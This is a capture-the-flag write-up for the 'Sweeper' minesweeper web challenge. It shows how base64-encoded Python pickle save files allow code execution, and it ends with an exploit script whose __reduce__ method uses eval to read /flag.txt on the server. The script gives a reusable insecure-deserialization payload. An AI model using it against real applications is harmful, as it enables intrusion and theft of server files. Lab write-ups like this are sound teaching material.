# CyberOpen Season II - Sweeper - Web Exploitation

## Challenge Description

A twist on a classic game. Tread lightly while you dig up the flag.

## High-level summary

This custom python implementation of the Windows' classic minesweeper game has a RCE vulnerability through insecure deserialization in the load/save aspect of the web application. The save files are base64 encoded python pickle objects that can be used to obtain RCE.

## Investigation

To solve this challenge, the creators said that we need to complete the minesweeper game normally; however, I have never played it before, so I won't be successful with this approach.

Besides clicking the tiles like you would in any minesweeper game, users are also able to load (upload) and save (download) game states, along with refreshing the game. Since I do not know the format of the game state, the first thing to do is to save or download the current game and analyze it. The save file is base64-encoded, and after decoding the base64 and generating a hexdump of the result, notice that the first 2 bytes is: `0x80 0x04` and contains strings such as: game_id, mines, flagged, etc.

![Alt text](./images/hexdump.PNG "Hexdump")

Command to get the above result: `cat sweeper.save | base64 -d | xxd`

After some research, the magic bytes: `0x80 0x04` indicates that the base64-encoded data is a python pickle object (see below for object/protocol referece... FIX THIS <---). I have never worked with python pickles before, but after so Googling, I found this site: https://davidhamann.de/2020/04/05/exploiting-python-pickle/, which explains how to exploit python pickles via deserialization (apparently the pickle module is not secure). The crux of the exploit relies on the `__reduce__()` class method, where it returns a tuple containing a callable object followed by a tuple of some arguments (this is referred to as the "reduced value"). The is important because "reduced values" are primarily used in object reconstruction, which will allow us to perform remote code execution during the deserialization or unpickling process when the challenge tries to load our malicious save file. Unpickling the decoded save file shows us that it's essentially a giant JSON file:

![Alt tetxt](./images/json.PNG "JSON Object")

### Determining path of exploitation

Looking at the networking section of your browser's development tools (I'm using Google Chrome), you can see that the minesweeper game is using web sockets to communicate between client and server. 

![Alt text](./images/websocket.PNG "Viewing websocket connections")

Since I don't have a public/reachable IP (due to multiple NATs from ISP -> Me), reverse shells or anything of that sort is not a viable option. What we can do however, is create our own json object and use that to load the flag into the game_id. Here's how the game_id is used:

![Alt text](./images/game_state.PNG "Viewing game_id in websocket")

From there, we can pickle our custom payload and save it to upload to the game. Once the game reloads, we would be able to look at the websocket traffic and read the flag from the game_id.

![Alt text](./images/flag.PNG "Woohoo!")

We get the flag: `USCG{f1ag5_4r3_a11_m1n3}`

## The Exploit

```python3
import pickle
import base64

class RCE():
    def __reduce__(self):
        return (eval, ("{'game_id' : open('/flag.txt','r').read()}",))

if __name__ == '__main__':
    bad_pickle = pickle.dumps(RCE())
    # print(RCE().__reduce__())
    with open('sweeper.save', 'wb') as file:
        file.write(base64.urlsafe_b64encode(bad_pickle))
```
